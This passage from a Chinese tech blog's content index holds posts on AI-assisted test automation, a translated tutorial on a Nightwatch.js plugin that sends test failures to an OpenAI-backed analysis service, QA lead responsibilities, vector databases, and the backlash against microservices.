这是难度最高的自动化测试类型，比如浏览器和app的自动化，尽管概念出现的非常早，而且也发展了相当长的一段时间，但是ui自动化的普及度却相对来说不算太高，在资源和时间有限的情况下，ui自动化测试往往是被大家优先降本增效的不二选择。\n类型gemini的大语言模型的出现，可能会给ui自动化带来革命性的变化。今后，我们可以直接向ai输入一些描述相对明确的测试用例，当然，是用自然语言编写的，ai可以推断出我们的测试意图，还原测试步骤，最终将测试步骤转化成测试代码，自动运行，通过运行中提供的截图和代码报错信息自动分析结果，自动迭代和修正代码错误，直到输出最终代码，基本上ui自动化是可以完美闭环的。\n也就是说也许不久之后我们只需要写好手工测试用例就可以完成相对完美的自动化测试工作了，以后的测试人员可能不再需要每个用例都去执行一遍，执行的工作应该可以被ai和机器替代绝大部分。\n顺便再考虑一下测试用例，如果ai的推断能力足够强的话，ai应该可以写出大部分的测试用例，这时候测试人员只需要补充一些极端场景的用例就可以了。\n那测试用例是从哪里来呢？可能是从产品文档里分析出来的，同样，如果模型精通多模态和推断的话，那么产品文档和产品设计图也是可以用ai去生成一大部分的，人工只要负责查缺补漏和提出修改意见就好了。同理，代码的话ai也能写个大部分，也许今后我们的工作方式会发生巨大的转变，从单纯的跟人合作变成跟人和ai一起协作，通用知识和能力将变得廉价，垂类的信息和领域知识可能会越来越值钱。\n接口自动化 接口自动化可能不太需要多模态，基于模型的推理和生成能力，如果模型支持海量的上下文输入的话，那么我们是完全可以为接口自动化的用例定义规则，并教会模型如何应用这些规则生成测试用例。\n举个例子，如果我们curd的接口遵循restful规则的话，ai是完全有能力生成restful接口的测试用例的，毕竟restful的规则比较清晰，而且对于具体资源来说接口和用例的数量都是可以枚举的。\n因此对于一些相对简单的接口，用ai去编写用例从直觉上来说是可行的，不过对于复杂接口，比如一些接口有很繁杂的前置依赖和操作步骤，ai自动根据接口文档的话可能不太好去推断各种具体场景，这种情况下我们可能需要一种接近自然语言的简化版中间语言，这种语言描述一些接口的输入输出以及构造复杂的接口测试场景，ai根据这种DSL去生成代码的话可能效率和准确性都要更高一点。\n因为这种简化语言的dsl也是有章法的，所有我们还可以用自然语言去描述接口测试的场景和出入参，让ai去帮助我们生成这种中间的dsl，通过llm的调用链的方式完成整体的接口自动化工作。\n单元测试 与前面两种测试类型相比，单元测试应该是相对容易落地的。之前看过有人做TDD,让ai去生成测试用例，然后根据用例去生成代码，这就是一种非常好的实践方式。从理论上和情感上说，我觉得以后的开发工作应该都是人与ai进行TDD的方式进行的。开发者拆分需求，设计数据结构，抽象表示形式，提取代码流程，然后要求ai生成单元测试用例，之后根据经验和场景，人工增加一些用例，让ai去实现可以通过测试的代码，然后重复上面的过程，直到代码最终完成，这时候我们可能得到结构良好和测试充分的代码了。\n数据生成 测试数据的生成往往是难度高而且费时费力的事情，但很多时候我们需要在测试环境和预发布环境构造大量的看上去很真实的测试数据。因为我们可能大部分的数据都是存在数据库里，插入数据的过程往往也可以用sql来表示，所以理论上应该是可以用ai去生成大量的测试数据的，毕竟现在的大语言模型在文本生成和代码生成上能力都相对可用。我想了一下，下面的两种方式应该是可行的。\n导出线上数据并进行脱敏。先导出一份数据，然后告诉ai脱敏规则，比如姓名，邮箱等，让ai自己推断如何进行敏感信息的替换，甚至可以让ai去判断哪些字段是敏感的，并且让ai去代码搜索数据的约束条件，比如银行卡的余额必须为正之类的信息，后面的脱敏工作让ai自己完成，反复进行多次之后应该可以得到一份相对可用的测试数据； 从零开始生成，让ai自己判断每个字段的意图，然后让ai去搜索代码里的约束规则，先让ai生成一份每个字段的生成规则，比如email字段就要生成符合条件的邮箱，然后人工抽查一下规则的可用性，如果没问题了就进行多轮生成，最后应该可以选择出几份可用的数据集。 总结 应该可以预见，在不久的将来，在算力和资源允许的情况下，自动化测试这个领域将迎来颠覆式的创新。不过作为普通测试人员也不用过度担心，首先我们大部分人可能也不会做自动化测试，那时候ai对我们来说可能是补充，而不是平替；其次如果ai的运行成本和运行效率比人类要高的话，大面积的替换也不会马上发生。\n不过ai还是未来了，在今后的某一天，ai很可能比绝大多数人都要稳定和便宜，到时候我们将何去何从？我还没想好，也许整个社会都还没有准备好吧。\n因为资本和人才的涌入，我猜，这一天也许会很快到来。\n","date":"2023-12-08T09:46:45+08:00","permalink":"zh.ethanhan.cc/p/gemini%E5%9C%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%BD%9C%E5%8A%9B/","title":"gemini在自动化测试中的潜力"},{"content":"今天看到有人用ai去分析自动化测试报告里的错误，代码和概念都很简单，也很有意思，忍不住翻译了一下，供大家参考。\n原文地址https://labs.pineview.io/using-openai-platform-to-analyse-automated-test-failures\n引言 当涉及到人工智能，尤其是OpenAI平台时，关于它将如何影响一切的内容并不缺乏。因此乍一看，本文可能似乎是另一篇过于热情和乐观的标题党文章，告诉你应该加入人工智能的行列，否则就会被落下。\n顺便说一下，本文并非由人工智能撰写。我只是使用我最喜欢的文本编辑器应用程序，它以西方文学中最令人激动的小说之一的名字命名——尤利西斯。除了一些基本的自动完成功能外，没有来自外部的干扰（或推理）。本文没有人工智能生成的废话，尽管我不能保证文章完全没有废话。\n但无论你对人工智能生成内容持何种立场，作为软件专业人士，我认为我们都可以达成共识：在自动化软件测试方面，调试和调查测试失败总是很繁琐。因此，我认为这可能是一个可以引入一些人工智能辅助的好领域，因为我们只是在扩展机器已经完成的工作。在这里，不存在冒充人类或“让人们误以为他们正在与真人互动”的风险，这正如哲学家丹尼尔·丹尼特在他最近在《大西洋月刊》上发表的文章中所提到的一个真正的文明风险。\n什么是端到端测试？ 如果你对端到端测试还不熟悉，它是一种通过模拟真实用户的操作来测试整个应用程序的自动化软件测试类型。\nNightwatch.js是一个开源库，用于编写和执行网站和Web应用程序的自动化端到端测试。它于2014年发布，2021年被转移到BrowserStack的开源计划办公室，目前正在进行开发。Nightwatch.js是用Node.js编写的，它支持所有主要的Web浏览器，并且还可以在移动设备上运行测试。\n本教程将介绍如何开发一个Nightwatch.js插件，将测试失败和相关错误发送到与OpenAI平台集成的服务，以分析错误并获得一些可操作的反馈。默认情况下，Nightwatch的最新版本已经对测试失败提供了相当好的反馈，并提供了一定程度的可操作反馈，因此我们将尝试使用GPT-4模型扩展其功能，以在输出消息中增加一些亮点，提供稍微更好的上下文，并学习如何开发结合人工智能辅助的服务。\n为什么选择Nightwatch？ 诚然，目前市场上还有一些其他备受炒作和流行的测试工具，但实际上Nightwatch是我们在2014年在Pineview创建的项目，现在正在BrowserStack的开源计划办公室进行开发。我也是那个团队的一员，Nightwatch仍然是我在所有其他项目中用于测试的最喜欢的工具，当然。\n此外，Nightwatch作为一个库已经存在了相当长的时间，在这些年里享有不同程度的受欢迎程度。有大量的可用于机器学习模型训练的数据，因此GPT-4在编写Nightwatch测试和解释结果方面具有相当好的能力，这意味着我们已经有了一个强大的基础，可以构建一个辅助人工智能来解释我们的测试失败，并可能与我们对抗。\n步骤1 - 创建错误分析服务 我们的小练习主要由两个部分组成，都相对简单：\n构建调用OpenAI服务的后端服务 编写Nightwatch.js插件，接收实际的测试失败并将其发送到后端服务进行分析 我们将从第1部分开始 - 构建错误分析服务。在当今时代，构建与人工智能相关的任何东西可能听起来非常奢侈和光鲜，但实际上这只是一个非常基本的任务，并没有太多特别之处。\n分析服务只是一个基本的express.js API服务，它接受POST请求并使用Node.js的SDK向OpenAI平台发出特定的调用。\n你需要从OpenAI这里获取一个开发者密钥，然后配置要使用的模型。为了本文的目的，我使用了gpt-4-1106-preview，但那需要一个付费计划。如果你想在免费计划上尝试它，你可以使用gpt-3.5-turbo。\n1.1 项目结构 使用以下命令设置新项目：\n1 2 3 4 mkdir nightwatch-openai-service cd nightwatch-openai-service touch index.js npm init -y 接下来，编辑package.json文件并设置type=module，例如：\n1 2 3 4 5 { \u0026#34;name\u0026#34;: \u0026#34;openai-nightwatch-service\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;module\u0026#34;, ... } 然后继续安装所需的依赖项：\n1 npm i dotenv express openai 1.2 添加服务 在新创建的项目中，创建两个新文件：\n.env - 包含OpenAI API密钥，例如：\n1 2 OPENAI_API_KEY=xxxxxx PORT=4001 index.js - 粘贴以下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import dotenv from \u0026#39;dotenv\u0026#39;; import express from \u0026#39;express\u0026#39;; import { OpenAI } from \u0026#39;openai\u0026#39;; dotenv.config(); const app = express(); app.use(express.json()); const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY }); app.post(\u0026#39;/analyze-error\u0026#39;, async (req, res) =\u0026gt; { try { const { errorMessage, codeSnippet, additionalDetails } = req.body; const details = `Additional details: Nightwatch version: ${additionalDetails.nightwatchVersion}, config file: ${additionalDetails.configFile}, platform: ${additionalDetails.platform}, browser: ${additionalDetails.browser}, headless mode: ${additionalDetails.headless}.`; const messages = [ { role: \u0026#34;system\u0026#34;, content: \u0026#34;You are an expert in web development using Node.js, automated testing with Selenium WebDriver, and the Nightwatch.js framework.\u0026#34; }, { role: \u0026#34;user\u0026#34;, content: [ { type: \u0026#34;text\u0026#34;, text: `Investigate and explain why the tests failed. Error message: ${errorMessage}\\n.Code snippet from test case where the error occurred: ${codeSnippet}. ${details}` } ] } ]; const response = await openai.chat.completions.create({ model: \u0026#34;gpt-4-1106-preview\u0026#34;, messages, max_tokens: 600, }); res.json({ analyzedResult: response.choices[0].message.content }); } catch (error) { res.status(500).json({ error: error.message }); } }); const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; console.log(`Server running on port ${PORT}`)); 至此，服务部分就完成了。只需使用以下命令运行它：\n1 node index.js 正如你所见，这里几乎没有涉及创造性的工作。我们将发送来自Nightwatch插件的错误消息，以及一个包含发生错误或断言失败的代码行的小代码片段。\n唯一剩下的事情就是调整提示。在OpenAI文档中有一个名为\u0026quot;prompt engineering\u0026quot;的完整部分，介绍了如何编写更好的提示以改进结果，这正是我们现在所关注的产品创新方面。\n代码可在Github(https://github.com/pineviewlabs/openai-nightwatch-service)上找到。请继续fork它并在本地运行，我们将在教程的下一部分中需要它。\n步骤2 - 编写Nightwatch.js报告插件 除了默认包含的内置测试报告器（junit-xml、json、html）之外，Nightwatch还支持加载自定义报告器的功能，这是我们接下来要开发的内容。\n完整的代码可以在Github上找到，该包已经在NPM上发布为nightwatch-openai-plugin，因此如果你愿意，你可以直接使用它并跳过第3步。\n自定义报告插件的作用是将错误数据发送到我们在第1步中开发的AI辅助分析服务。为此，我们需要创建一个新的Node.js项目，遵循Nightwatch能够理解的特定结构。\n2.1 项目结构 首先，使用以下命令设置新项目：\n1 2 3 4 5 mkdir my-nightwatch-ai-reporter cd my-nightwatch-ai-reporter touch index.js npm init -y git init 基本上，插件需要被包装为一个NPM包，并导出一个如下所示的模块：\n1 2 3 4 5 6 7 // index.js module.exports = { async reporter(results) { console.log(\u0026#39;在这里进行一些报告...\u0026#39;); } } 我们还需要添加一个.env文件，其中将填入我们的AI分析服务的URL。\n如果你按照本文第1步的说明运行服务，则.env文件如下所示：\n1 SERVICE_URL=http://localhost:4001/analyze-error 2.2 编写自定义报告器 现在，我们只需要在index.js文件的reporter()函数中添加一些逻辑，将报告发送到第1步的分析服务，并显示结果。分析服务将使用我们定义的提示调用OpenAI平台。\n当测试运行完成时，Nightwatch将调用带有results参数的报告器函数，该参数包含失败的结果和其他相关错误。下面是具体的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 module.exports = { async reporter(results) { const errors = getErrorMessages(results); if (!errors) { return; } const outputs = makeOutputs(errors); for (const output of outputs) { try { const response = sendErrorAnalysisRequest(output); const terminalOutput = marked.parse(response.data.analyzedResult); console.log(\u0026#39;错误分析完成：\u0026#39;, terminalOutput); } catch (err) { console.error(\u0026#39;错误分析失败：\u0026#39;, error.response?.data || error.message); } } } } sendErrorAnalysisRequest函数将使用测试数据发起一个POST请求。\n第3步 - 将所有内容整合在一起 现在，我们已经有了插件和服务，是时候将它们整合到一个测试项目中了。我们将构建一个小型的端到端测试项目，其中包含一个示例网站的一些非常基本的测试。该项目将使用Nightwatch来运行测试，并使用我们新创建的插件。\n3.1 设置一个测试项目 首先，使用以下命令创建一个测试项目：\n1 2 3 mkdir nightwatch-testing cd nightwatch-testing npm init -y 3.2 从NPM安装Nightwatch Nightwatch可以通过以下命令从NPM安装，并且准备就绪：\n1 npm i nightwatch 你可以使用以下命令验证Nightwatch是否已安装：\n1 npx nightwatch --info 3.3 添加Nightwatch报告插件 现在，我们将在步骤2中开发的AI分析插件添加到我们的测试项目中，以便Nightwatch可以发现并使用它。\n你可以直接从NPM安装该包，或者如果你已经完整地完成了步骤2，也可以使用本地版本。\n从NPM安装插件：\n1 npm i nightwatch-openai-plugin 从本地文件夹安装（根据实际路径进行更新，相对路径也适用）：\n1 npm i /path/to/my-nightwatch-ai-reporter 3.4 配置Nightwatch加载插件 为了使Nightwatch能够加载插件，我们需要在nightwatch配置文件（nightwatch.conf.js）中进行定义。\n首先，让我们查看package.json文件。它应该在依赖项列表中包含插件。假设插件是从NPM安装的，它应该如下所示：\n1 2 3 4 5 6 7 8 { \u0026#34;name\u0026#34;: \u0026#34;nightwatch-testing\u0026#34;, ... \u0026#34;dependencies\u0026#34;: { \u0026#34;nightwatch\u0026#34;: \u0026#34;^3.3.1\u0026#34;, \u0026#34;nightwatch-openai-plugin\u0026#34;: \u0026#34;^0.1.0\u0026#34; } } 现在打开nightwatch.conf.js文件，并将nightwatch-openai-plugin添加到插件数组中，如下所示：\n1 2 3 4 5 6 7 // nightwatch.conf.js module.exports = { // ... 其他设置 plugins: [\u0026#39;nightwatch-openai-plugin\u0026#39;], // ... 继续设置 } 你可以通过使用Chrome运行一个与库捆绑在一起的示例测试来验证Nightwatch是否已安装并正常工作：\n1 npx nightwatch examples/tests/duckDuckGo.js --chrome 输出结果将如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 ℹ Connected to ChromeDriver on port 9515 (1001ms). Using: chrome (119.0.6045.123) on MAC. Running Search Nightwatch.js and check results: ─────────────────────────────────────────────────────────────── ✔ Element \u0026lt;body\u0026gt; was visible after 15 milliseconds. ✔ Testing if element \u0026lt;input[name=\u0026#34;q\u0026#34;]\u0026gt; is visible (17ms) ✔ Testing if element \u0026lt;button[type=submit]\u0026gt; is visible (14ms) ✔ Testing if element \u0026lt;.react-results--main\u0026gt; contains text \u0026#39;Nightwatch.js\u0026#39; (1545ms) ✨ PASSED. 4 assertions. (2.534s) 你还可以根据你在计算机上安装的浏览器选择使用--firefox、--safari或--edge选项。\n第4步 - 运行测试并检查分析报告 现在，我们已经安装并配置了Nightwatch，并在第1步中使用插件开发了AI辅助分析服务，我们可以运行更多的端到端测试并看到它的运行情况。\n如果你还没有完成第1步，或者想在开始之前先了解一下，我已经为你准备了一个示例项目，其中包括一个演示后端服务，可以直接运行，这样你就可以看到它的运行情况：\nGitHub - pineviewlabs/nightwatch-ai-testproject Contribute to pineviewlabs/nightwatch-ai-testproject development by creating an account on GitHub. GitHubpineviewlabs\n请随意fork它并在本地运行。请注意，分析服务仅以演示目的的有限容量运行，不应在实际测试场景中使用。\n4.1 添加一些端到端测试 对于那些已经完成了前面步骤并深入其中的人，我们只需要添加一些基本的测试，以便我们可以在本地运行所有内容。\n进入nightwatch-testing文件夹并创建一个新的test文件夹：\n1 mkdir test 然后在test文件夹中添加以下两个测试：\nhomepage.js 1 2 3 4 5 6 7 8 9 10 describe(\u0026#39;Homepage End-to-end Test\u0026#39;, () =\u0026gt; { it(\u0026#39;tests if homepage is loaded\u0026#39;, browser =\u0026gt; { browser .navigateTo(\u0026#39;https://middlemarch.netlify.app/\u0026#39;) .assert.visible(\u0026#39;#app .new-arrivals-panel\u0026#39;) .expect.elements(\u0026#39;#app .new-arrivals-panel .col-md-6\u0026#39;).count.toEqual(4) }); }); addtocart.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;add to cart test\u0026#39;, () =\u0026gt; { before(browser =\u0026gt; browser.navigateTo(\u0026#39;https://middlemarch.netlify.app/\u0026#39;)); it(\u0026#39;adds 2 volumes of \u0026#34;Rhinoceros and Other Plays\u0026#34; to cart\u0026#39;, browser =\u0026gt; { const addToCartEl = browser.element.findByText(\u0026#39;Rhinoceros and Other Plays\u0026#39;).getParentElement().find(\u0026#39;button\u0026#39;); addToCartEl.click() addToCartEl.click() browser.assert.textEquals(\u0026#39;.shopping-cart .badge\u0026#39;, \u0026#39;2\u0026#39;); }); after(browser =\u0026gt; browser.end()); }); 这两个测试是针对一个示例书店应用程序编写的，是我之前关于Vite和Vue 3的教程的一部分。第一个测试只是打开网站并验证内容是否存在，而第二个测试将一本书添加到购物车并执行基本断言。\n要运行这些测试，请使用以下命令，如果你不想在测试过程中看到浏览器弹出，请选择传递\u0026ndash;headless参数：\n1 npx nightwatch test --chrome 或者根据你的计算机上可用的浏览器选择\u0026ndash;firefox、\u0026ndash;safari或\u0026ndash;edge选项。\n4.2 故意使测试失败 为了测试AI分析服务，我们需要故意使至少一个测试失败。然后插件报告器将生效，将测试失败发送到后端服务，然后打印结果。\n幸运的是，有许多可用的方法来使测试失败。其中一种最简单的方法是重命名其中一个元素，然后等待测试失败并显示“元素未找到”的错误。\n模拟“元素未找到”错误 编辑test文件夹中的homepage.js文件，将以.assert.visible开头的行更改为以下内容：\n1 2 3 browser .navigateTo(\u0026#39;https://middlemarch.netlify.app/\u0026#39;) .assert.visible(\u0026#39;#xapp\u0026#39;) 然后测试将以错误消息失败，指示无法找到选择器为#xapp的元素，并打印类似于以下输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 TEST FAILURE (12.844s): - 1 assertions failed; 1 passed ✖ 1) homepage – tests if homepage is loaded (7.903s) → ✖ NightwatchAssertError Testing if element \u0026lt;#xapp .new-arrivals-panel\u0026gt; is visible in 5000ms - expected \u0026#34;is visible\u0026#34; but got: \u0026#34;element could not be located\u0026#34; (5131ms) Error location: /Users/andrei/pineviewlabs/nightwatch-openai/test/homepage.js:6 ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––– 4 | browser 5 | .navigateTo(\u0026#39;https://middlemarch.netlify.app/\u0026#39;) 6 | .assert.visible(\u0026#39;#xapp .new-arrivals-panel\u0026#39;) 7 | .expect.elements(\u0026#39;#app .new-arrivals-panel .col-md-6\u0026#39;).count.toEqual(4) 8 | }); ––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––– 然后我们实际上可以看到来自AI分析服务的报告：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 错误分析完成：失败表明在5000ms（5秒）的时间范围内未找到具有CSS选择器#xapp .new-arrivals-panel的元素。以下是您可以用于调试的操作： 1. 更新测试代码： .debug({selector: \u0026#34;#xapp .new-arrivals-panel\u0026#34;}) // 添加此行 .browser.expect.element(\u0026#39;#xapp .new-arrivals-panel\u0026#39;).to.be.visible.before(5000); 2. 使用调试标志运行Nightwatch： nightwatch --debug --devtools 这将打开Chrome开发者工具，您可以在其中检查页面和控制台。 导致错误的可能原因包括： * 元素在测试时不存在于页面上。 * 由于页面尚未加载完成、存在网络延迟或显示元素的JavaScript运行较晚，该元素在5秒内不可见。 * 选择器不正确或已更改。 * 页面的JavaScript中存在错误，导致元素无法正确显示。 报告可能有点过长和过于通用，但现在只需要调整提示，使其生成所需的结果，这不是本文的任务。\n4.3 配置分析后端服务 nightwatch-openai-plugin使用默认的HTTP API服务与OpenAI API进行交互，该服务仅供演示目的使用。您可以通过克隆openai-nightwatch-service存储库并使用自己的OpenAI API密钥运行它来托管自己的服务。\n在运行openai-nightwatch-service时，您需要定义NIGHTWATCH_ANALYSIS_SERVICE_URL环境变量，指向服务的URL。您还可以使用.env文件。\n例如，假设您将服务运行在http://localhost:4001上，您可以在Nightwatch项目的根目录中创建一个.env文件，内容如下：\n1 NIGHTWATCH_ANALYSIS_SERVICE_URL=http://localhost:4001/analyze-error 结论 所以，我们已经成功构建（希望如此）一个用于Nightwatch测试的AI辅助分析插件，并且我们已经看到它的实际效果。您现在可以尝试模拟各种错误并查看响应。\n请记住，这只是一个实验，该服务仅供演示目的使用。我尚未尝试不同类型的错误和测试失败，并且我没有花太多时间来调整提示，因此无法保证它能够适用于大量的测试集合，其中可能存在不同类型的失败。因此，您需要自行承担风险，但欢迎您进行自己的实验并报告您的发现。感谢阅读。\n","date":"2023-12-01T10:22:47+08:00","permalink":"zh.ethanhan.cc/p/%E4%BD%BF%E7%94%A8openai%E6%9D%A5%E5%88%86%E6%9E%90%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF/","title":"使用openAI来分析自动化测试报告的错误信息"},{"content":"很少看到有人讨论qa leader的职责，最近正好看到一篇，随手翻译了一下，供大家参考。\n在这篇文章中，我将分享我作为测试负责人的经验。\n负责人可以是测试负责人、QA负责人、测试负责人，等等。\n虽然职位名称可能不同，但我负责领导一个测试团队。\n根据我大约20年的经验，我列出了负责人QA工程师的任务。\n负责人扮演着双重角色。\n他/她既是实际参与者，也是管理者。\n实际参与者意味着他编写测试用例，运行它们，报告错误，进行缺陷审查等等。\n这些任务都是由个人贡献者完成的。对吧？\n除此之外，负责人还承担其他任务。\n这比个人贡献者更多。他/她是产品/项目的其他利益相关者眼中的团队代表。\n现在，让我们详细了解这些任务。\n作为个人贡献者的活动 QA负责人的主要任务是测试。\n也就是实际参与者。通常，负责人的工作分配大约是70-30%的时间。\n也就是70%作为个人测试人员，30%作为负责人的活动。\n这可能因项目而异。\n好了，现在作为手动测试人员，负责人会做以下工作：\n实际测试 编写测试用例， 执行测试用例。 编写自动化脚本， 审查测试用例/自动化代码 执行脚本 提bug 文档编写 你可能会说这些都是由每个团队成员完成的。对吧？\n作为负责人的活动 现在，让我们看看负责人特定的任务。\n我还列出了负责人的责任。\n分配任务。 进行工作量估计。 对测试负责。 通过支持他们来保护测试人员。 对估算的任何延误负责。 确保分配的任务完成。 有点像夹心饼干 - 位于管理层和团队之间！ 准备不同的文档，如测试策略、测试计划。 还准备测试报告、状态报告。 与开发、IT、产品、客户支持团队进行沟通。 帮助招聘和建立自己团队以及其他团队。 在公司和客户层面为测试工具/项目或自动化开展多个概念验证（POC）。 培训初级人员。 在需要专家知识的其他项目中做出贡献，或者只是帮助他们进行指导/审查他们的自动化。因此，这是负责人提供的额外咨询服务。 在其他人不计划休假时支持团队交付工作。也就是说，当需要时，负责人（他/她）会介入并执行任务。 寻找改进测试流程的方法，并为团队创造心理安全环境，使他们能够做出最好的工作。 发布计划和估算。在发布计划和估算中发表意见是QA负责人的主要技能和责任。 与支持团队一起解决生产问题。 例如，重现问题，确定延误的根本原因等等。 设计/增强自动化框架 总而言之，QA负责人领导、指导和监控测试分析、设计、实施和执行，测试程序和测试套件。\n负责人是QA团队的代表。他承担了以上所列的更多责任。\n通常，初级测试人员会取笑负责人，说他/她什么都不做，只会下命令！\n现在你知道了，测试负责人承担了更多的责任并执行任务。\n","date":"2023-11-23T14:24:39+08:00","permalink":"zh.ethanhan.cc/p/qa-leader%E7%9A%84%E8%81%8C%E8%B4%A3%E6%98%AF%E4%BB%80%E4%B9%88/","title":"QA Leader的职责是什么"},{"content":"对于向量数据库有疑问吗？以下是对这个数据库的简要解释。\n什么是向量？ 向量是一组数字的数组，表示点在空间中沿多个维度的位置。例如，向量{12, 13, 19, 8, 9}表示一个点在5个维度上的位置。向量可以几何地表示数据，使得数据点之间可以进行数学比较。\n向量与嵌入有什么关系？ 在机器学习中，嵌入是表示数据点（如单词、句子、图像等）的向量。嵌入将数据的语义含义编码为向量形式。它们由经过训练的神经网络生成，这些网络将数据点映射到有效的向量表示。这些嵌入将相关概念放置在向量空间中靠近的位置。\n向量数据库如何工作？ 向量数据库存储了各种数据点（如文档、图像、产品等）的嵌入，并将这些嵌入映射回其原始数据。数据库可以基于向量的相似性进行快速的相似性搜索。查询嵌入可以与存储的嵌入进行比较，最相似的向量可以几乎即时地被检索出来。这为语义搜索、推荐和其他人工智能应用提供了支持。\n向量数据库在人工智能中的应用是什么？ 向量数据库具有几个关键的人工智能应用：\n语义搜索 - 基于含义而不仅仅是关键词来检索信息 推荐 - 提供与用户兴趣最相关的内容 大型语言模型 - 理解上下文中的单词，用于生成和摘要 异常检测 - 识别与正常情况相比的异常数据点 图像分类 - 基于视觉属性对图像进行分类 通过促进快速的相似性比较，向量数据库使得机器学习模型能够在数据之间建立联系。这支持了使用原始数据无法实现的高级人工智能功能。向量空间充当算法构建理解的一种\u0026quot;记忆\u0026quot;。\n","date":"2023-11-23T10:50:29+08:00","permalink":"zh.ethanhan.cc/p/%E4%BB%80%E4%B9%88%E4%BA%8B%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"什么事向量数据库"},{"content":"最近比较热门的圈内话题，出了下云就是对微服务的讨论。\n微服务今年又一次的引起了广泛讨论可能是源自今年年初亚马逊内部的一次架构迁移。\n起因 在这个案例中，Prime Video 团队将一个监控系统从微服务架构迁移到单体架构，并避免使用昂贵的服务（如 AWS Step Functions 和 Lambda 无服务器函数），并对此举所带来的降本效果进行了评估。简单来说就是该团队通过将服务从微服务变成单体应用取得了明显的降本增效的效果。\n这个例子引发了广泛的关注和讨论，一时间人们似乎不知道该如何去评价这件事情。反倒是一直鼓吹下云和反对微服务化的dhh（可以理解为著名网络喷子）一针见血，他指出：即使是亚马逊也无法理解无服务器或微服务。\n讨论 事件逐渐发酵，目前关于逃离微服务的讨论可以频繁的见诸报端，比如前几天有人就这样的评价微服务\n\u0026ldquo;microservices conflate logical boundaries (how code is written) with physical boundaries (how code is deployed).\u0026rdquo; \u0026ldquo;we propose a different programming methodology\u0026rdquo; \u0026ldquo;Our implementation reduces application latency by up to 15x and cost by up to 9x\u0026rdquo;\n\u0026ldquo;微服务将逻辑边界（代码编写方式）与物理边界（代码部署方式）混为一谈。\u0026rdquo; \u0026ldquo;我们提出了一种不同的编程方法论。\u0026rdquo; \u0026ldquo;我们的实现可以将应用程序的延迟降低多达15倍，成本降低多达9倍。\u0026rdquo; 这里有一个非常有意思的点，那就是有没有一种可能单体服务比微服务其实要节省资源？\n还有人认为微服务其实是一种权衡，并给出了下列的忠告。\n谨慎地拥抱复杂性 投身于微服务不仅仅是一个技术决策，而是对复杂性的一种承诺。有时候，为了追随潮流，我们似乎在破坏一个系统。并非每个应用程序都需要一个相互连接的服务网络。正如Sam Newman在《构建微服务》一书中提到的那样，架构需要满足一定的前提条件，否则就可能过度设计。\n灵活性是有代价的 是的，微服务承诺了灵活性，但也伴随着沉重的代价，不仅仅是基础设施方面的代价，还包括认知负荷。每个服务都变成了自己的领域，需要专门的关注。\n没有一种大小适合所有 如果我从中获得了什么，那就是架构决策不能孤立地脱离业务需求而做出。一个灵活的初创公司的需求与传统的企业应用程序截然不同。虽然像Netflix那样的案例研究对我们启发很大，但我们必须认识到，适用于某个公司的解决方案未必适用于所有公司。\n为什么 上面对于微服务的讨论完全是基于技术层面的，其实从成本角度我们可以更好的理解这个趋势。\n之前技术公司蓬勃发展，人员不断壮大，这时候就需要把服务拆小拆细，因为拆分引入的复杂性就需要投入更多的人力进行开发和维护，因此服务越拆越小，团队规模越来越大，每个人都有活干，因此大家心照不宣的默认微服务是最佳实践，讨论比较多的就是微服务的优点，对于微服务的缺陷一般点到为止，毕竟喷微服务等于毁人饭碗。\n现在整体经济不景气，大家为了节约资源开始八仙过海各显神通，比如下云，用自建机房去替代公有云服务。假如之前的假设：微服务比单体服务更消耗资源，是正确的话，那么转单体应用也能节约成本。另外各大公司近年来也是频繁裁员，人变少了，微服务引入的复杂性可能会被成倍放大，因此合服务也是顺理成章。指挥棒一换，对微服务质疑的声音也就多了起来。\ntwitter的实践 我们从twitter的实践可以很好的察觉到一些蛛丝马迹。最近twitter宣布进行了一些的优化，最终达到了降低成本的目的，其中就有。\n从头开始完全重建了\u0026quot;For You\u0026quot;的服务和排名系统，导致代码行数减少了90%，从 70 万行减少到 7 万行，计算占用减少了 50%，每次请求中评分的帖子吞吐量增加了 80%。\n这里猜测是不是有可能把微服务合成了单体服务，从而减少了大量的代码？\n重构了技术堆栈的 API 中间件层，简化了架构，去掉了超过 10 万行代码和数千个未使用的内部端点，并消除了未被采纳的客户服务。\n这里是删代码，也可能合了一些服务？\n关闭了萨克拉门托数据中心，重新配置了 5200 个机架和 14.8 万台服务器，带来了每年超过 1 亿美元的节省。总共，X 平台释放了 48 兆瓦的容量，重新配置了 60,000 磅的网络梯架，然后将其提供给其他数据中心。\n这里是换便宜的机房。\n优化了 X 平台对云服务提供商的使用，并开始更多地在本地进行。这一转变使 X 平台的月度云成本降低了 60%。X 平台的工程团队所做的变化之一是将所有媒体/数据块工件从云中移出，这将其云数据存储大小降低了 60%，另外，该团队成功地将云数据处理成本降低了 75%。\n这里是下云。\n总结 